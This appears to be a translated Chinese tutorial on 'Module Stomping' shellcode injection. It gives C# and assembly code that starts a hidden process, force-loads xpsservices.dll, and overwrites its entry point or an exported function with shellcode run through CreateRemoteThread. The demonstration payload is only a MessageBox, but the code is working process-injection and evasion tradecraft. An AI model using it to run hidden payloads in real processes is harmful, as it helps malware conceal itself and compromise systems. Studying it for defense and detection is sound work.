Module Stomping



Module Stomping，也有人称它为Module Overloading和DLL Hollowing，是一种Shellcode注入技术，其工作原理如下：


  • 创建一个进程或打开现有进程的句柄。

  • 强制该进程从磁盘加载合法的DLL。

  • 将Shellcode写入DLL的某个位置。

  • 使用CreateRemoteThread或其他启动执行（例如UserQueueAPC也可以）。


选择要加载的DLL时，最重要的是要考虑其大小。我们无法加载小于Shellcode的DLL，因为分配给模块的内存区域中没有足够的空间。




演示步骤



启动隐藏进程非常简单：


var process = new Process{    StartInfo = new ProcessStartInfo    {        FileName = "notepad",        WindowStyle = ProcessWindowStyle.Hidden    }};
process.Start();


一旦启动，就可以在Process Hacker中看到已加载的模块。



加载DLL


这一步很有趣，且具有挑战性。把DLL加载到远程进程的“正常“方式如下所示：


// Module name as byte[]var moduleName = Encoding.ASCII.GetBytes("xpsservices.dll");
// Allocate memory and write module name into remote processvar alloc = Win32.VirtualAllocEx(process.Handle, IntPtr.Zero, (uint)moduleName.Length, Win32.AllocationType.Commit, Win32.MemoryProtection.ReadWrite);Win32.WriteProcessMemory(process.Handle, alloc, moduleName, (uint)moduleName.Length, out UIntPtr _);
// Get location of LoadLibraryA in Kernel32var kernel = Win32.LoadLibraryEx("kernel32.dll", IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);var loadLibrary = Win32.GetProcAddress(kernel, "LoadLibraryA");
// Call CRT at the location of the modulename and specify the LoadLibrary address as the start routineWin32.CreateRemoteThread(process.Handle, IntPtr.Zero, 0, loadLibrary, alloc, 0, IntPtr.Zero);


这样做的问题在于，LoadLibraryA会调用DllMain DLL_PROCESS_ATTACH，并被每个创建（然后销毁）的线程调用，DLL_THREAD_ATTACH和DLL_THREAD_DETACH触发。由于我在模块的EntryPointAddress上方编写Shellcode，因此这些常量事件导致Shellcode多次执行。


可以通过使用LoadLibraryEx解决这个问题。这个API有另外要加载的东西，一组包含DONT_RESOLVE_DLL_REFERENCES的标志便是其中一个。其指示系统加载DLL，但不处理DLL的导入表，也不调用DllMain。问题在于我们只能提供一个参数CreateRemoteThread，所以我们只能发送要加载的模块名称。


我最初是想是写一个本地DLL，调用LoadLibraryExA到DLL_PROCESS_ATTACH上，并将它注入到进程。通过Process Hacker注入DLL表明该模块已加载，但这不是一个很好的解决方案。因为这是一条简单的指令，所以Ceri想手写所需的操作码，然后注入，取代转换为shellcode的整个DLL。


分别为x86 和 x64生成的“shim”以很小的18/22 bytes出现。




Shim



为了了解Shim，我们查看一些伪高级C＃代码，它能让我们对shellcode的作用有所了解。


HMODULE RemoteThreadFunc(string moduleName){    return LoadLibraryExA(moduleName, 0, DONT_RESOLVE_DLL_REFERENCES);}


如你所见，这是一个非常简单的代理。它将参数从线程函数传递到对LoadLibraryExA模块的调用，包括对常数0和1（DONT_RESOLVE_DLL_REFERENCES）的调用。因此，让我们先看下x86版本。


x86


mov eax, 0xAAAAAAAApush 1push 0push [esp+12]call eaxret 12


x86上的stdcall调用约定的参数始终使用堆栈将参数传递给被调用方，但是参数以相反的顺序推送。第三次推送实际上引用了一个已经在堆栈上的指针（moduleName参数的地址）。通常，在针对任何功能的第一条指令中，第一参数位于esp+4。但是，因为我们已经推送了两个准备好调用的其他参数LoadLibraryExA，所以堆栈指针将再减少8个字节，因此指向我们模块名称地址的指针将位于esp+12。


一旦用于调用的参数准备就绪，汇编代码便使用eax寄存器中包含的函数地址执行间接函数调用。该代码当前具有的占位符，0xAAAAAAAA地址为LoadLibraryExA。这将从父进程计算得出，并在运行时修补。最后，一旦调用完成，我们就从shim返回，但只有在将堆栈指针调整12个字节，满足我们对堆栈指针所做的修改后，才会返回。


x64


通常在x64，寄存器用于传递前4个参数：RCX，RDX，R8和R9。有时会使用其他寄存器，例如浮点数或其他特殊数据类型，但对于我们的用例，这些将是我们关注的寄存器。


mov rax, 0xAAAAAAAAAAAAAAAA     # Pointer to LoadLibraryExmov r8, 1                       # DONT_RESOLVE_DLL_REFERENCESxor rdx, rdx                    # Less bytes than mov rdx, 0 but same outcomejmp rax                         # Pass control to LoadLibraryEx


对于x64，我们只需4条指令。由于我们只操作寄存器而不会弄乱堆栈，因此我们也可以立即跳转到LoadLibraryExA，而不必进行函数调用和设置其他堆栈框架。我们也无需设置RCX寄存器，因为这是已有的shim的第一个参数，已指向包含要重新加载的模块的字符串。


因此，现在我们只需要将其放入一个辅助函数中，即可马上生成shellcode，修补 LoadLibraryExA地址。

注入shellcode前，我们需要在进程地址空间内为可执行shim分配一些读取/执行内存，以及一些只有读取功能的内存来容纳字符串，这些字符串包含要加载的模块名称。DLL加载步骤的最后一个阶段就是使用指向被分配的shim shellcode的指针和指向模块名称的指针作为唯一参数，在远程进程中开启一个线程。

我们现在可以看到xpsservices.dll已经被加载出来。



注入Shellcode


接着，我们要在分配给它的内存空间里编写shellcode。第一次是编写到模块的BaseAddress里，可以通过使用Process类找到C#。


// Re-fetch the process informationprocess = Process.GetProcessById(process.Id);
IntPtr baseAddress;
// Iterate through each ProcessModuleforeach (ProcessModule module in process.Modules){    if (module.ModuleName.Equals("xpsservices.dll", StringComparison.OrdinalIgnoreCase))    {        baseAddress = module.BaseAddress;        break;    }}


这会给出一个像0x7ffd4fcf0000的地址。在Process Hacker中进行交叉引用，该地址在圈起来的区域内。



有了BaseAddress，我们只需添加一个页面即可进入该主要RX区域，例如：


baseAddress = module.BaseAddress + 0x1000


但由于Control Flow Guard的缘故，尝试从该位置执行shellcode会导致崩溃。


EntryPointAddress


下一步就是找模块的EntryPointAddress，但遇到了另一个难题，DLL加载时没有调用DllMain，所以信息在ProcessModule数据中不可用：


module.EntryPointAddress0x0000000000000000

（旁注：幸亏我聪明，之后我用LoadLibraryA加载了DLL，信息就出现了。）


如果从当前进程中调用LoadLibraryA，就可以获取EntryPointAddress（因为目标进程中的地址与当前进程中的地址相同）。


Win32.LoadLibraryA("xpsservices.dll");var self = Process.GetCurrentProcess();
IntPtr entryPointAddress;
foreach (ProcessModule module in self.Modules){    if (module.ModuleName.Equals("xpsservices.dll", StringComparison.OrdinalIgnoreCase))    {        entryPointAddress = module.EntryPointAddress;        break;    }}
module.EntryPointAddress0x00007ffd4febf3a0


现在，如果在这个地址编写一些shellcode，就会弹出一个MessageBox！

导出函数


如果你不想覆盖EntryPointAddress，你也可以覆盖任何一种导出函数。xpsservices.dll只能导出两种函数：


  • DllCanUnloadNow

  • DllGetClassObject


所以可以这样做：


var xps = Win32.LoadLibraryA("xpsservices.dll");var funcAddress = Win32.GetProcAddress(xps, "DllCanUnloadNow");
// [...snip...] //
Win32.WriteProcessMemory(process.Handle, funcAddress, sc, (uint)sc.Length, out UIntPtr _);Win32.CreateRemoteThread(process.Handle, IntPtr.Zero, 0, funcAddress, IntPtr.Zero, 0, IntPtr.Zero);


Moar boxes会弹出来，同时可以看到线程地址在导出函数中。





远程地址的稳定性



假设远程进程中的导出函数位于相同的地址，加载xpsservices.dll到当前流程中，同时执行GetProcAddress。虽然正确率八九不离十，但不能打包票。


与其逐个用这个地址，还不如用它去计算与模块基地址的偏移量，因为方法是相同的（假设没有从x86注入x64进程，反之亦然）。


// Get address of exported function in our processvar xps = Win32.LoadLibraryExA("xpsservices.dll", IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);var funcAddress = Win32.GetProcAddress(xps, "DllCanUnloadNow");
// Calculate the offset from the base address and the exported function addressvar funcOffset = (long)funcAddress - (long)xps;
// Get the target process and iterate through the modulesprocess = Process.GetProcessById(process.Id);
IntPtr remoteFuncAddress;
foreach (ProcessModule module in process.Modules){    if (module.ModuleName.Equals("xpsservices.dll", StringComparison.OrdinalIgnoreCase))    {        // Get the module's base address and add our calculated offset to it        remoteFuncAddress = new IntPtr((long)module.BaseAddress + funcOffset);        break;    }}
